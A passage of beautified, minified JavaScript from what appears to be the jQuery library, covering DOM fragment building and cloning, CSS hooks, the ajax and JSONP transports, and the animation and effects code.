                        }) : c.globalEval((b.text || b.textContent || b.innerHTML || "").replace(Ob, "/*$0*/"));
                        b.parentNode && b.parentNode.removeChild(b)
                    })
            }
            return this
        }
    });
    c.buildFragment = function(a, b, e) {
        var d, f, g, k, h = a[0];
        b && b[0] && (k = b[0].ownerDocument || b[0]);
        k.createDocumentFragment || (k = n);
        1 === a.length && "string" == typeof h && 512 > h.length && k === n && "<" === h.charAt(0) && !Nb.test(h) && (c.support.checkClone || !ab.test(h)) && (c.support.html5Clone || !$a.test(h)) &&
            (f = !0, g = c.fragments[h], g && 1 !== g && (d = g));
        d || (d = k.createDocumentFragment(), c.clean(a, k, d, e));
        f && (c.fragments[h] = g ? d : 1);
        return {
            fragment: d,
            cacheable: f
        }
    };
    c.fragments = {};
    c.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(a, b) {
        c.fn[a] = function(e) {
            var d = [];
            e = c(e);
            var f = 1 === this.length && this[0].parentNode;
            if (f && 11 === f.nodeType && 1 === f.childNodes.length && 1 === e.length) return e[b](this[0]), this;
            for (var f = 0, g = e.length; f < g; f++) {
                var k = (0 < f ? this.clone(!0) :
                    this).get();
                c(e[f])[b](k);
                d = d.concat(k)
            }
            return this.pushStack(d, a, e.selector)
        }
    });
    c.extend({
        clone: function(a, b, e) {
            var d, f, g;
            c.support.html5Clone || c.isXMLDoc(a) || !$a.test("<" + a.nodeName + ">") ? d = a.cloneNode(!0) : (d = n.createElement("div"), qa.appendChild(d), d.innerHTML = a.outerHTML, d = d.firstChild);
            var k = d;
            if (!(c.support.noCloneEvent && c.support.noCloneChecked || 1 !== a.nodeType && 11 !== a.nodeType || c.isXMLDoc(a)))
                for (Da(a, k), d = ba(a), f = ba(k), g = 0; d[g]; ++g) f[g] && Da(d[g], f[g]);
            if (b && (Ea(a, k), e))
                for (d = ba(a), f = ba(k),
                    g = 0; d[g]; ++g) Ea(d[g], f[g]);
            return k
        },
        clean: function(a, b, e, d) {
            var f, g = [];
            b = b || n;
            "undefined" == typeof b.createElement && (b = b.ownerDocument || b[0] && b[0].ownerDocument || n);
            for (var k = 0, h; null != (h = a[k]); k++)
                if ("number" == typeof h && (h += ""), h) {
                    if ("string" == typeof h)
                        if (Lb.test(h)) {
                            h = h.replace(Ya, "<$1></$2>");
                            f = (Za.exec(h) || ["", ""])[1].toLowerCase();
                            var l = C[f] || C._default,
                                p = l[0],
                                m = b.createElement("div"),
                                q = qa.childNodes,
                                t;
                            b === n ? qa.appendChild(m) : Fa(b).appendChild(m);
                            for (m.innerHTML = l[1] + h + l[2]; p--;) m = m.lastChild;
                            if (!c.support.tbody)
                                for (p = Kb.test(h), l = "table" !== f || p ? "<table>" !== l[1] || p ? [] : m.childNodes : m.firstChild && m.firstChild.childNodes, f = l.length - 1; 0 <= f; --f) c.nodeName(l[f], "tbody") && !l[f].childNodes.length && l[f].parentNode.removeChild(l[f]);
                            !c.support.leadingWhitespace && pa.test(h) && m.insertBefore(b.createTextNode(pa.exec(h)[0]), m.firstChild);
                            h = m.childNodes;
                            m && (m.parentNode.removeChild(m), 0 < q.length && (t = q[q.length - 1], t && t.parentNode && t.parentNode.removeChild(t)))
                        } else h = b.createTextNode(h);
                    var r;
                    if (!c.support.appendChecked)
                        if (h[0] &&
                            "number" == typeof(r = h.length))
                            for (f = 0; f < r; f++) Ba(h[f]);
                        else Ba(h);
                    h.nodeType ? g.push(h) : g = c.merge(g, h)
                }
            if (e)
                for (a = function(a) {
                        return !a.type || bb.test(a.type)
                    }, k = 0; g[k]; k++) b = g[k], d && c.nodeName(b, "script") && (!b.type || bb.test(b.type)) ? d.push(b.parentNode ? b.parentNode.removeChild(b) : b) : (1 === b.nodeType && (h = c.grep(b.getElementsByTagName("script"), a), g.splice.apply(g, [k + 1, 0].concat(h))), e.appendChild(b));
            return g
        },
        cleanData: function(a) {
            for (var b, e, d = c.cache, f = c.event.special, g = c.support.deleteExpando, k = 0,
                    h; null != (h = a[k]); k++)
                if (!h.nodeName || !c.noData[h.nodeName.toLowerCase()])
                    if (e = h[c.expando]) {
                        if ((b = d[e]) && b.events) {
                            for (var l in b.events) f[l] ? c.event.remove(h, l) : c.removeEvent(h, l, b.handle);
                            b.handle && (b.handle.elem = null)
                        }
                        g ? delete h[c.expando] : h.removeAttribute && h.removeAttribute(c.expando);
                        delete d[e]
                    }
        }
    });
    var ra = /alpha\([^)]*\)/i,
        Pb = /opacity=([^)]*)/,
        Qb = /([A-Z]|^ms)/g,
        Rb = /^[\-+]?(?:\d*\.)?\d+$/i,
        ja = /^-?(?:\d*\.)?\d+(?!px)[^\d\s]+$/i,
        Sb = /^([\-+])=([\-+.\de]+)/,
        Tb = /^margin/,
        Ub = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        M = ["Top", "Right", "Bottom", "Left"],
        N, cb, db;
    c.fn.css = function(a, b) {
        return c.access(this, function(a, b, f) {
            return f !== m ? c.style(a, b, f) : c.css(a, b)
        }, a, b, 1 < arguments.length)
    };
    c.extend({
        cssHooks: {
            opacity: {
                get: function(a, b) {
                    if (b) {
                        var c = N(a, "opacity");
                        return "" === c ? "1" : c
                    }
                    return a.style.opacity
                }
            }
        },
        cssNumber: {
            fillOpacity: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            "float": c.support.cssFloat ? "cssFloat" : "styleFloat"
        },
        style: function(a,
            b, e, d) {
            if (a && 3 !== a.nodeType && 8 !== a.nodeType && a.style) {
                var f, g = c.camelCase(b),
                    k = a.style,
                    h = c.cssHooks[g];
                b = c.cssProps[g] || g;
                if (e === m) return h && "get" in h && (f = h.get(a, !1, d)) !== m ? f : k[b];
                d = typeof e;
                "string" === d && (f = Sb.exec(e)) && (e = +(f[1] + 1) * +f[2] + parseFloat(c.css(a, b)), d = "number");
                if (!(null == e || "number" === d && isNaN(e) || ("number" === d && !c.cssNumber[g] && (e += "px"), h && "set" in h && (e = h.set(a, e)) === m))) try {
                    k[b] = e
                } catch (l) {}
            }
        },
        css: function(a, b, e) {
            var d, f;
            b = c.camelCase(b);
            f = c.cssHooks[b];
            b = c.cssProps[b] || b;
            "cssFloat" ===
            b && (b = "float");
            if (f && "get" in f && (d = f.get(a, !0, e)) !== m) return d;
            if (N) return N(a, b)
        },
        swap: function(a, b, c) {
            var d = {},
                f;
            for (f in b) d[f] = a.style[f], a.style[f] = b[f];
            c = c.call(a);
            for (f in b) a.style[f] = d[f];
            return c
        }
    });
    c.curCSS = c.css;
    n.defaultView && n.defaultView.getComputedStyle && (cb = function(a, b) {
        var e, d, f, g, k = a.style;
        b = b.replace(Qb, "-$1").toLowerCase();
        (d = a.ownerDocument.defaultView) && (f = d.getComputedStyle(a, null)) && (e = f.getPropertyValue(b), "" === e && !c.contains(a.ownerDocument.documentElement, a) && (e = c.style(a,
            b)));
        !c.support.pixelMargin && f && Tb.test(b) && ja.test(e) && (g = k.width, k.width = e, e = f.width, k.width = g);
        return e
    });
    n.documentElement.currentStyle && (db = function(a, b) {
        var c, d, f, g = a.currentStyle && a.currentStyle[b],
            k = a.style;
        null == g && k && (f = k[b]) && (g = f);
        ja.test(g) && (c = k.left, d = a.runtimeStyle && a.runtimeStyle.left, d && (a.runtimeStyle.left = a.currentStyle.left), k.left = "fontSize" === b ? "1em" : g, g = k.pixelLeft + "px", k.left = c, d && (a.runtimeStyle.left = d));
        return "" === g ? "auto" : g
    });
    N = cb || db;
    c.each(["height", "width"], function(a,
        b) {
        c.cssHooks[b] = {
            get: function(a, d, f) {
                if (d) return 0 !== a.offsetWidth ? Aa(a, b, f) : c.swap(a, Ub, function() {
                    return Aa(a, b, f)
                })
            },
            set: function(a, b) {
                return Rb.test(b) ? b + "px" : b
            }
        }
    });
    c.support.opacity || (c.cssHooks.opacity = {
        get: function(a, b) {
            return Pb.test((b && a.currentStyle ? a.currentStyle.filter : a.style.filter) || "") ? parseFloat(RegExp.$1) / 100 + "" : b ? "1" : ""
        },
        set: function(a, b) {
            var e = a.style,
                d = a.currentStyle,
                f = c.isNumeric(b) ? "alpha(opacity=" + 100 * b + ")" : "",
                g = d && d.filter || e.filter || "";
            e.zoom = 1;
            if (1 <= b && "" === c.trim(g.replace(ra,
                    "")) && (e.removeAttribute("filter"), d && !d.filter)) return;
            e.filter = ra.test(g) ? g.replace(ra, f) : g + " " + f
        }
    });
    c(function() {
        c.support.reliableMarginRight || (c.cssHooks.marginRight = {
            get: function(a, b) {
                return c.swap(a, {
                    display: "inline-block"
                }, function() {
                    return b ? N(a, "margin-right") : a.style.marginRight
                })
            }
        })
    });
    c.expr && c.expr.filters && (c.expr.filters.hidden = function(a) {
            var b = a.offsetHeight;
            return 0 === a.offsetWidth && 0 === b || !c.support.reliableHiddenOffsets && "none" === (a.style && a.style.display || c.css(a, "display"))
        },
        c.expr.filters.visible = function(a) {
            return !c.expr.filters.hidden(a)
        });
    c.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(a, b) {
        c.cssHooks[a + b] = {
            expand: function(c) {
                var d = "string" == typeof c ? c.split(" ") : [c],
                    f = {};
                for (c = 0; 4 > c; c++) f[a + M[c] + b] = d[c] || d[c - 2] || d[0];
                return f
            }
        }
    });
    var Vb = /%20/g,
        mb = /\[\]$/,
        eb = /\r?\n/g,
        Wb = /#.*$/,
        Xb = /^(.*?):[ \t]*([^\r\n]*)\r?$/mg,
        Yb = /^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,
        Zb = /^(?:GET|HEAD)$/,
        $b = /^\/\//,
        fb = /\?/,
        ac = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
        bc = /^(?:select|textarea)/i,
        za = /\s+/,
        cc = /([?&])_=[^&]*/,
        gb = /^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,
        hb = c.fn.load,
        ia = {},
        ib = {},
        O, K, jb = ["*/"] + ["*"];
    try {
        O = tb.href
    } catch (ic) {
        O = n.createElement("a"), O.href = "", O = O.href
    }
    K = gb.exec(O.toLowerCase()) || [];
    c.fn.extend({
        load: function(a, b, e) {
            if ("string" != typeof a && hb) return hb.apply(this, arguments);
            if (!this.length) return this;
            var d = a.indexOf(" ");
            if (0 <= d) {
                var f = a.slice(d, a.length);
                a = a.slice(0,
                    d)
            }
            d = "GET";
            b && (c.isFunction(b) ? (e = b, b = m) : "object" == typeof b && (b = c.param(b, c.ajaxSettings.traditional), d = "POST"));
            var g = this;
            c.ajax({
                url: a,
                type: d,
                dataType: "html",
                data: b,
                complete: function(a, b, d) {
                    d = a.responseText;
                    a.isResolved() && (a.done(function(a) {
                        d = a
                    }), g.html(f ? c("<div>").append(d.replace(ac, "")).find(f) : d));
                    e && g.each(e, [d, b, a])
                }
            });
            return this
        },
        serialize: function() {
            return c.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                return this.elements ? c.makeArray(this.elements) :
                    this
            }).filter(function() {
                return this.name && !this.disabled && (this.checked || bc.test(this.nodeName) || Yb.test(this.type))
            }).map(function(a, b) {
                var e = c(this).val();
                return null == e ? null : c.isArray(e) ? c.map(e, function(a, c) {
                    return {
                        name: b.name,
                        value: a.replace(eb, "\r\n")
                    }
                }) : {
                    name: b.name,
                    value: e.replace(eb, "\r\n")
                }
            }).get()
        }
    });
    c.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "), function(a, b) {
        c.fn[b] = function(a) {
            return this.on(b, a)
        }
    });
    c.each(["get", "post"], function(a, b) {
        c[b] = function(a,
            d, f, g) {
            c.isFunction(d) && (g = g || f, f = d, d = m);
            return c.ajax({
                type: b,
                url: a,
                data: d,
                success: f,
                dataType: g
            })
        }
    });
    c.extend({
        getScript: function(a, b) {
            return c.get(a, m, b, "script")
        },
        getJSON: function(a, b, e) {
            return c.get(a, b, e, "json")
        },
        ajaxSetup: function(a, b) {
            b ? xa(a, c.ajaxSettings) : (b = a, a = c.ajaxSettings);
            xa(a, b);
            return a
        },
        ajaxSettings: {
            url: O,
            isLocal: /^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/.test(K[1]),
            global: !0,
            type: "GET",
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            processData: !0,
            async: !0,
            accepts: {
                xml: "application/xml, text/xml",
                html: "text/html",
                text: "text/plain",
                json: "application/json, text/javascript",
                "*": jb
            },
            contents: {
                xml: /xml/,
                html: /html/,
                json: /json/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText"
            },
            converters: {
                "* text": t.String,
                "text html": !0,
                "text json": c.parseJSON,
                "text xml": c.parseXML
            },
            flatOptions: {
                context: !0,
                url: !0
            }
        },
        ajaxPrefilter: ya(ia),
        ajaxTransport: ya(ib),
        ajax: function(a, b) {
            function e(a, b, e, n) {
                if (2 !== x) {
                    x = 2;
                    A && clearTimeout(A);
                    B = m;
                    t = n || "";
                    v.readyState = 0 < a ?
                        4 : 0;
                    var q, r, u;
                    n = b;
                    if (e) {
                        var y = d,
                            z = v,
                            H = y.contents,
                            D = y.dataTypes,
                            I = y.responseFields,
                            w, F, G, M;
                        for (F in I) F in e && (z[I[F]] = e[F]);
                        for (;
                            "*" === D[0];) D.shift(), w === m && (w = y.mimeType || z.getResponseHeader("content-type"));
                        if (w)
                            for (F in H)
                                if (H[F] && H[F].test(w)) {
                                    D.unshift(F);
                                    break
                                }
                        if (D[0] in e) G = D[0];
                        else {
                            for (F in e) {
                                if (!D[0] || y.converters[F + " " + D[0]]) {
                                    G = F;
                                    break
                                }
                                M || (M = F)
                            }
                            G = G || M
                        }
                        G ? (G !== D[0] && D.unshift(G), e = e[G]) : e = void 0
                    } else e = m;
                    if (200 <= a && 300 > a || 304 === a) {
                        if (d.ifModified) {
                            if (w = v.getResponseHeader("Last-Modified")) c.lastModified[p] =
                                w;
                            if (w = v.getResponseHeader("Etag")) c.etag[p] = w
                        }
                        if (304 === a) n = "notmodified", q = !0;
                        else try {
                            w = d;
                            w.dataFilter && (e = w.dataFilter(e, w.dataType));
                            var O = w.dataTypes;
                            F = {};
                            var K, L, Q = O.length,
                                N, R = O[0],
                                J, P, S, U, W;
                            for (K = 1; K < Q; K++) {
                                if (1 === K)
                                    for (L in w.converters) "string" == typeof L && (F[L.toLowerCase()] = w.converters[L]);
                                J = R;
                                R = O[K];
                                if ("*" === R) R = J;
                                else if ("*" !== J && J !== R) {
                                    P = J + " " + R;
                                    S = F[P] || F["* " + R];
                                    if (!S)
                                        for (U in W = m, F)
                                            if (N = U.split(" "), N[0] === J || "*" === N[0])
                                                if (W = F[N[1] + " " + R]) {
                                                    U = F[U];
                                                    !0 === U ? S = W : !0 === W && (S = U);
                                                    break
                                                }
                                    S ||
                                        W || c.error("No conversion from " + P.replace(" ", " to "));
                                    !0 !== S && (e = S ? S(e) : W(U(e)))
                                }
                            }
                            r = e;
                            n = "success";
                            q = !0
                        } catch (T) {
                            n = "parsererror", u = T
                        }
                    } else if (u = n, !n || a) n = "error", 0 > a && (a = 0);
                    v.status = a;
                    v.statusText = "" + (b || n);
                    q ? k.resolveWith(f, [r, n, v]) : k.rejectWith(f, [v, n, u]);
                    v.statusCode(l);
                    l = m;
                    C && g.trigger("ajax" + (q ? "Success" : "Error"), [v, d, q ? r : u]);
                    h.fireWith(f, [v, n]);
                    C && (g.trigger("ajaxComplete", [v, d]), --c.active || c.event.trigger("ajaxStop"))
                }
            }
            "object" == typeof a && (b = a, a = m);
            b = b || {};
            var d = c.ajaxSetup({}, b),
                f = d.context ||
                d,
                g = f !== d && (f.nodeType || f instanceof c) ? c(f) : c.event,
                k = c.Deferred(),
                h = c.Callbacks("once memory"),
                l = d.statusCode || {},
                p, n = {},
                q = {},
                t, r, B, A, u, x = 0,
                C, H, v = {
                    readyState: 0,
                    setRequestHeader: function(a, b) {
                        if (!x) {
                            var c = a.toLowerCase();
                            a = q[c] = q[c] || a;
                            n[a] = b
                        }
                        return this
                    },
                    getAllResponseHeaders: function() {
                        return 2 === x ? t : null
                    },
                    getResponseHeader: function(a) {
                        var b;
                        if (2 === x) {
                            if (!r)
                                for (r = {}; b = Xb.exec(t);) r[b[1].toLowerCase()] = b[2];
                            b = r[a.toLowerCase()]
                        }
                        return b === m ? null : b
                    },
                    overrideMimeType: function(a) {
                        x || (d.mimeType = a);
                        return this
                    },
                    abort: function(a) {
                        a = a || "abort";
                        B && B.abort(a);
                        e(0, a);
                        return this
                    }
                };
            k.promise(v);
            v.success = v.done;
            v.error = v.fail;
            v.complete = h.add;
            v.statusCode = function(a) {
                if (a) {
                    var b;
                    if (2 > x)
                        for (b in a) l[b] = [l[b], a[b]];
                    else b = a[v.status], v.then(b, b)
                }
                return this
            };
            d.url = ((a || d.url) + "").replace(Wb, "").replace($b, K[1] + "//");
            d.dataTypes = c.trim(d.dataType || "*").toLowerCase().split(za);
            null == d.crossDomain && (u = gb.exec(d.url.toLowerCase()), d.crossDomain = !(!u || u[1] == K[1] && u[2] == K[2] && (u[3] || ("http:" === u[1] ? 80 : 443)) ==
                (K[3] || ("http:" === K[1] ? 80 : 443))));
            d.data && d.processData && "string" != typeof d.data && (d.data = c.param(d.data, d.traditional));
            aa(ia, d, b, v);
            if (2 === x) return !1;
            C = d.global;
            d.type = d.type.toUpperCase();
            d.hasContent = !Zb.test(d.type);
            C && 0 === c.active++ && c.event.trigger("ajaxStart");
            if (!d.hasContent && (d.data && (d.url += (fb.test(d.url) ? "&" : "?") + d.data, delete d.data), p = d.url, !1 === d.cache)) {
                u = c.now();
                var D = d.url.replace(cc, "$1_=" + u);
                d.url = D + (D === d.url ? (fb.test(d.url) ? "&" : "?") + "_=" + u : "")
            }(d.data && d.hasContent && !1 !== d.contentType ||
                b.contentType) && v.setRequestHeader("Content-Type", d.contentType);
            d.ifModified && (p = p || d.url, c.lastModified[p] && v.setRequestHeader("If-Modified-Since", c.lastModified[p]), c.etag[p] && v.setRequestHeader("If-None-Match", c.etag[p]));
            v.setRequestHeader("Accept", d.dataTypes[0] && d.accepts[d.dataTypes[0]] ? d.accepts[d.dataTypes[0]] + ("*" !== d.dataTypes[0] ? ", " + jb + "; q=0.01" : "") : d.accepts["*"]);
            for (H in d.headers) v.setRequestHeader(H, d.headers[H]);
            if (d.beforeSend && (!1 === d.beforeSend.call(f, v, d) || 2 === x)) return v.abort(), !1;
            for (H in {
                    success: 1,
                    error: 1,
                    complete: 1
                }) v[H](d[H]);
            if (B = aa(ib, d, b, v)) {
                v.readyState = 1;
                C && g.trigger("ajaxSend", [v, d]);
                d.async && 0 < d.timeout && (A = setTimeout(function() {
                    v.abort("timeout")
                }, d.timeout));
                try {
                    x = 1, B.send(n, e)
                } catch (z) {
                    if (2 > x) e(-1, z);
                    else throw z;
                }
            } else e(-1, "No Transport");
            return v
        },
        param: function(a, b) {
            var e = [],
                d = function(a, b) {
                    b = c.isFunction(b) ? b() : b;
                    e[e.length] = encodeURIComponent(a) + "=" + encodeURIComponent(b)
                };
            b === m && (b = c.ajaxSettings.traditional);
            if (c.isArray(a) || a.jquery && !c.isPlainObject(a)) c.each(a,
                function() {
                    d(this.name, this.value)
                });
            else
                for (var f in a) ha(f, a[f], b, d);
            return e.join("&").replace(Vb, "+")
        }
    });
    c.extend({
        active: 0,
        lastModified: {},
        etag: {}
    });
    var dc = c.now(),
        ea = /(\=)\?(&|$)|\?\?/i;
    c.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            return c.expando + "_" + dc++
        }
    });
    c.ajaxPrefilter("json jsonp", function(a, b, e) {
        b = "string" == typeof a.data && /^application\/x\-www\-form\-urlencoded/.test(a.contentType);
        if ("jsonp" === a.dataTypes[0] || !1 !== a.jsonp && (ea.test(a.url) || b && ea.test(a.data))) {
            var d, f = a.jsonpCallback =
                c.isFunction(a.jsonpCallback) ? a.jsonpCallback() : a.jsonpCallback,
                g = t[f],
                k = a.url,
                h = a.data,
                l = "$1" + f + "$2";
            !1 !== a.jsonp && (k = k.replace(ea, l), a.url === k && (b && (h = h.replace(ea, l)), a.data === h && (k += (/\?/.test(k) ? "&" : "?") + a.jsonp + "=" + f)));
            a.url = k;
            a.data = h;
            t[f] = function(a) {
                d = [a]
            };
            e.always(function() {
                t[f] = g;
                d && c.isFunction(g) && t[f](d[0])
            });
            a.converters["script json"] = function() {
                d || c.error(f + " was not called");
                return d[0]
            };
            a.dataTypes[0] = "json";
            return "script"
        }
    });
    c.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /javascript|ecmascript/
        },
        converters: {
            "text script": function(a) {
                c.globalEval(a);
                return a
            }
        }
    });
    c.ajaxPrefilter("script", function(a) {
        a.cache === m && (a.cache = !1);
        a.crossDomain && (a.type = "GET", a.global = !1)
    });
    c.ajaxTransport("script", function(a) {
        if (a.crossDomain) {
            var b, c = n.head || n.getElementsByTagName("head")[0] || n.documentElement;
            return {
                send: function(d, f) {
                    b = n.createElement("script");
                    b.async = "async";
                    a.scriptCharset && (b.charset = a.scriptCharset);
                    b.src = a.url;
                    b.onload = b.onreadystatechange = function(a,
                        d) {
                        if (d || !b.readyState || /loaded|complete/.test(b.readyState)) b.onload = b.onreadystatechange = null, c && b.parentNode && c.removeChild(b), b = m, d || f(200, "success")
                    };
                    c.insertBefore(b, c.firstChild)
                },
                abort: function() {
                    b && b.onload(0, 1)
                }
            }
        }
    });
    var sa = t.ActiveXObject ? function() {
            for (var a in P) P[a](0, 1)
        } : !1,
        ec = 0,
        P;
    c.ajaxSettings.xhr = t.ActiveXObject ? function() {
        var a;
        if (!(a = !this.isLocal && wa())) a: {
            try {
                a = new t.ActiveXObject("Microsoft.XMLHTTP");
                break a
            } catch (b) {}
            a = void 0
        }
        return a
    } : wa;
    (function(a) {
        c.extend(c.support, {
            ajax: !!a,
            cors: !!a && "withCredentials" in a
        })
    })(c.ajaxSettings.xhr());
    c.support.ajax && c.ajaxTransport(function(a) {
        if (!a.crossDomain || c.support.cors) {
            var b;
            return {
                send: function(e, d) {
                    var f = a.xhr(),
                        g, k;
                    a.username ? f.open(a.type, a.url, a.async, a.username, a.password) : f.open(a.type, a.url, a.async);
                    if (a.xhrFields)
                        for (k in a.xhrFields) f[k] = a.xhrFields[k];
                    a.mimeType && f.overrideMimeType && f.overrideMimeType(a.mimeType);
                    a.crossDomain || e["X-Requested-With"] || (e["X-Requested-With"] = "XMLHttpRequest");
                    try {
                        for (k in e) f.setRequestHeader(k,
                            e[k])
                    } catch (h) {}
                    f.send(a.hasContent && a.data || null);
                    b = function(e, k) {
                        var h, n, t, r, B;
                        try {
                            if (b && (k || 4 === f.readyState))
                                if (b = m, g && (f.onreadystatechange = c.noop, sa && delete P[g]), k) 4 !== f.readyState && f.abort();
                                else {
                                    h = f.status;
                                    t = f.getAllResponseHeaders();
                                    r = {};
                                    (B = f.responseXML) && B.documentElement && (r.xml = B);
                                    try {
                                        r.text = f.responseText
                                    } catch (A) {}
                                    try {
                                        n = f.statusText
                                    } catch (u) {
                                        n = ""
                                    }
                                    h || !a.isLocal || a.crossDomain ? 1223 === h && (h = 204) : h = r.text ? 200 : 404
                                }
                        } catch (x) {
                            k || d(-1, x)
                        }
                        r && d(h, n, r, t)
                    };
                    a.async && 4 !== f.readyState ? (g = ++ec, sa &&
                        (P || (P = {}, c(t).unload(sa)), P[g] = b), f.onreadystatechange = b) : b()
                },
                abort: function() {
                    b && b(0, 1)
                }
            }
        }
    });
    var ga = {},
        I, L, fc = /^(?:toggle|show|hide)$/,
        gc = /^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,
        fa, Y = [
            ["height", "marginTop", "marginBottom", "paddingTop", "paddingBottom"],
            ["width", "marginLeft", "marginRight", "paddingLeft", "paddingRight"],
            ["opacity"]
        ],
        Z;
    c.fn.extend({
        show: function(a, b, e) {
            var d;
            if (a || 0 === a) return this.animate(Q("show", 3), a, b, e);
            b = 0;
            for (e = this.length; b < e; b++) a = this[b], a.style && (d = a.style.display, !c._data(a, "olddisplay") &&
                "none" === d && (d = a.style.display = ""), ("" === d && "none" === c.css(a, "display") || !c.contains(a.ownerDocument.documentElement, a)) && c._data(a, "olddisplay", ua(a.nodeName)));
            for (b = 0; b < e; b++)
                if (a = this[b], a.style && (d = a.style.display, "" === d || "none" === d)) a.style.display = c._data(a, "olddisplay") || "";
            return this
        },
        hide: function(a, b, e) {
            if (a || 0 === a) return this.animate(Q("hide", 3), a, b, e);
            var d;
            b = 0;
            for (e = this.length; b < e; b++) a = this[b], a.style && (d = c.css(a, "display"), "none" !== d && !c._data(a, "olddisplay") && c._data(a, "olddisplay",
                d));
            for (b = 0; b < e; b++) this[b].style && (this[b].style.display = "none");
            return this
        },
        _toggle: c.fn.toggle,
        toggle: function(a, b, e) {
            var d = "boolean" == typeof a;
            c.isFunction(a) && c.isFunction(b) ? this._toggle.apply(this, arguments) : null == a || d ? this.each(function() {
                var b = d ? a : c(this).is(":hidden");
                c(this)[b ? "show" : "hide"]()
            }) : this.animate(Q("toggle", 3), a, b, e);
            return this
        },
        fadeTo: function(a, b, c, d) {
            return this.filter(":hidden").css("opacity", 0).show().end().animate({
                opacity: b
            }, a, c, d)
        },
        animate: function(a, b, e, d) {
            function f() {
                !1 ===
                    g.queue && c._mark(this);
                var b = c.extend({}, g),
                    d = 1 === this.nodeType,
                    e = d && c(this).is(":hidden"),
                    f, n, m, t, r, B, A, u, x;
                b.animatedProperties = {};
                for (m in a)
                    if (f = c.camelCase(m), m !== f && (a[f] = a[m], delete a[m]), (n = c.cssHooks[f]) && "expand" in n)
                        for (m in t = n.expand(a[f]), delete a[f], t) m in a || (a[m] = t[m]);
                for (f in a) {
                    n = a[f];
                    c.isArray(n) ? (b.animatedProperties[f] = n[1], n = a[f] = n[0]) : b.animatedProperties[f] = b.specialEasing && b.specialEasing[f] || b.easing || "swing";
                    if ("hide" === n && e || "show" === n && !e) return b.complete.call(this);
                    d && ("height" === f || "width" === f) && (b.overflow = [this.style.overflow, this.style.overflowX, this.style.overflowY], "inline" === c.css(this, "display") && "none" === c.css(this, "float") && (c.support.inlineBlockNeedsLayout && "inline" !== ua(this.nodeName) ? this.style.zoom = 1 : this.style.display = "inline-block"))
                }
                null != b.overflow && (this.style.overflow = "hidden");
                for (m in a) d = new c.fx(this, b, m), n = a[m], fc.test(n) ? (x = c._data(this, "toggle" + m) || ("toggle" === n ? e ? "show" : "hide" : 0), x ? (c._data(this, "toggle" + m, "show" === x ? "hide" : "show"),
                    d[x]()) : d[n]()) : (r = gc.exec(n), B = d.cur(), r ? (A = parseFloat(r[2]), u = r[3] || (c.cssNumber[m] ? "" : "px"), "px" !== u && (c.style(this, m, (A || 1) + u), B *= (A || 1) / d.cur(), c.style(this, m, B + u)), r[1] && (A = ("-=" === r[1] ? -1 : 1) * A + B), d.custom(B, A, u)) : d.custom(B, n, ""));
                return !0
            }
            var g = c.speed(b, e, d);
            if (c.isEmptyObject(a)) return this.each(g.complete, [!1]);
            a = c.extend({}, a);
            return !1 === g.queue ? this.each(f) : this.queue(g.queue, f)
        },
        stop: function(a, b, e) {
            "string" != typeof a && (e = b, b = a, a = m);
            b && !1 !== a && this.queue(a || "fx", []);
            return this.each(function() {
                var b,
                    f = !1,
                    g = c.timers,
                    k = c._data(this);
                e || c._unmark(!0, this);
                if (null == a)
                    for (b in k) {
                        if (k[b] && k[b].stop && b.indexOf(".run") === b.length - 4) {
                            var h = k[b];
                            c.removeData(this, b, !0);
                            h.stop(e)
                        }
                    } else k[b = a + ".run"] && k[b].stop && (k = k[b], c.removeData(this, b, !0), k.stop(e));
                for (b = g.length; b--;) g[b].elem !== this || null != a && g[b].queue !== a || (e ? g[b](!0) : g[b].saveState(), f = !0, g.splice(b, 1));
                e && f || c.dequeue(this, a)
            })
        }
    });
    c.each({
        slideDown: Q("show", 1),
        slideUp: Q("hide", 1),
        slideToggle: Q("toggle", 1),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(a, b) {
        c.fn[a] = function(a, c, f) {
            return this.animate(b, a, c, f)
        }
    });
    c.extend({
        speed: function(a, b, e) {
            var d = a && "object" == typeof a ? c.extend({}, a) : {
                complete: e || !e && b || c.isFunction(a) && a,
                duration: a,
                easing: e && b || b && !c.isFunction(b) && b
            };
            d.duration = c.fx.off ? 0 : "number" == typeof d.duration ? d.duration : d.duration in c.fx.speeds ? c.fx.speeds[d.duration] : c.fx.speeds._default;
            if (null == d.queue || !0 === d.queue) d.queue = "fx";
            d.old = d.complete;
            d.complete = function(a) {
                c.isFunction(d.old) && d.old.call(this);
                d.queue ? c.dequeue(this, d.queue) : !1 !== a && c._unmark(this)
            };
            return d
        },
        easing: {
            linear: function(a) {
                return a
            },
            swing: function(a) {
                return -Math.cos(a * Math.PI) / 2 + .5
            }
        },
        timers: [],
        fx: function(a, b, c) {
            this.options = b;
            this.elem = a;
            this.prop = c;
            b.orig = b.orig || {}
        }
    });
    c.fx.prototype = {
        update: function() {
            this.options.step && this.options.step.call(this.elem, this.now, this);
            (c.fx.step[this.prop] || c.fx.step._default)(this)
        },
        cur: function() {
            if (null != this.elem[this.prop] && (!this.elem.style || null == this.elem.style[this.prop])) return this.elem[this.prop];
            var a, b = c.css(this.elem, this.prop);
            return isNaN(a = parseFloat(b)) ? b && "auto" !== b ? b : 0 : a
        },
        custom: function(a, b, e) {
            function d(a) {
                return f.step(a)
            }
            var f = this,
                g = c.fx;
            this.startTime = Z || va();
            this.end = b;
